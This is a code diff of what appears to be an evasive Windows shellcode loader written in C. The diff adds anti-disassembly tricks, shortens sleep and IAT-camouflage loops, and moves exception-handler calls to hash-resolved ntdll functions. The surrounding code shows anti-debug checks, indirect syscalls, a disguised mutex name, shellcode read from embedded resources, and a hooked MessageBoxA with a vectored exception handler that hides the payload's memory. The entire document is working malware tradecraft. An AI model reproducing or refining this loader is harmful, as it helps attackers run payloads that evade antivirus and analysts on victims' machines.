@@ -9,6 +9,7 @@
 
 // Anti-XXXX functions
 #include "anti-debug.h"
+#include "anti-disass.h"
 
 // Indirect syscalls via tartarus gate
 #include "indirect_syscall.h"
@@ -49,6 +50,11 @@ NTAPI_FUNC _G_NTFUNC = { 0 };
 //int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmdshow){
 int main(void) {
 
+	// Anti-Disassembly
+	AntiDisassmConstantCondition();
+	AntiDisassmAsmJmpSameTarget();
+	AntiDisassmImpossibleDiasassm();
+
 	NTSTATUS STATUS = NULL;
 	WCHAR MUTANTNAME[] = { '\\','B','a','s','e','N','a','m','e','d','O','b','j','e','c','t','s','\\','S','M','0',':','4','2','1','2',':','T','I','G','1','2','0',':','W','i','l','E','r','r','o','r','_','0','3', 0x0 };
 
@@ -57,7 +63,8 @@ int main(void) {
 		return -1;
 	}
 
-	for (int i = 0; i < 5; i++) {
+	// Increase the number for longer operation
+	for (int i = 0; i < 1; i++) {
 		camoflage_IAT();
 	}
 
@@ -65,7 +72,7 @@ int main(void) {
 
 	// example: -10000000 = 1sec relative to current :)
 	// Used by NtDelayExecution()
-	LONGLONG sleepTimer = -150000000; 
+	LONGLONG sleepTimer = -50000000; 
 
 	BOOL MutexRes = FALSE;
 
@@ -106,16 +113,14 @@ int main(void) {
 	PRINTA("[+] Debugger checks -> PASS\n");
 #endif
 
-
-	t_AddVectoredExceptionHandler _AddVectoredExceptionHandler =
-		(t_AddVectoredExceptionHandler)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), ADDVECTOREDEXCEPTIONHANDLER_HASH);
+	t_RtlAddVectoredExceptionHandler RtlAddVectoredExceptionHandler = (t_RtlAddVectoredExceptionHandler)_GetProcAddress(_GetModuleHandle(NTDLL_HASH), RTLADDVECTOREDEXCEPTIONHANDLER_HASH);
 #ifdef DEBUG
-	PRINTA("Addr VectoredExceptionHandler WinAPI -> %p\n", _AddVectoredExceptionHandler);
+	PRINTA("Addr VectoredExceptionHandler WinAPI -> %p\n", RtlAddVectoredExceptionHandler);
 	//system("pause");
 #endif
 
 	SET_HANDLERINFO((DWORD64)&MessageBoxA, (DWORD64)&hook_MessageBox);
-	PVOID pEhandler = AddVectoredExceptionHandler(1, &e_handler);
+	PVOID pEhandler = RtlAddVectoredExceptionHandler(1, &e_handler);
 
 #ifdef DEBUG
 	//PRINTA("Vectored Handler result: 0x%p\n", pEhandler);
@@ -180,7 +185,11 @@ int _TIGER(HANDLE hMutant, PVOID Handler) {
 	t_LockResource LockResource			= (t_LockResource)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), LOCKRESOURCE_HASH);
 	t_SizeofResource SizeofResource		= (t_SizeofResource)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), SIZEOFRESOURCE_HASH);
 	t_FreeResource FreeResource			= (t_FreeResource)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), FREERESOURCE_HASH);
-	t_RtlSecureZeroMemory RtlSecureZeroMemory = (t_RtlSecureZeroMemory)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), RTLSECUREZEROMEMORY_HASH);
+	t_RtlSecureZeroMemory RtlSecureZeroMemory = 
+		(t_RtlSecureZeroMemory)_GetProcAddress(_GetModuleHandle(KERNEL32_HASH), RTLSECUREZEROMEMORY_HASH);
+
+	t_RtlRemoveVectoredExceptionHandler RtlRemoveVectoredExceptionHandler = 
+		(t_RtlRemoveVectoredExceptionHandler)_GetProcAddress(_GetModuleHandle(NTDLL_HASH), RTLREMOVEVECTOREDEXCEPTIONHANDLER_HASH);
 
 	// Get the shellcode from resource (.rsrc)
 	HRSRC res = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_SCODE1), RT_RCDATA);
@@ -241,7 +250,7 @@ int _TIGER(HANDLE hMutant, PVOID Handler) {
 		// Call MessageBoxA and protect the shellcode memory block
 		MessageBoxA(NULL, "Unexpected behaviour!", "Error", 0x00000010L);
 
-		RemoveVectoredExceptionHandler(Handler);
+		RtlRemoveVectoredExceptionHandler(Handler);
 
 	}
 	else {
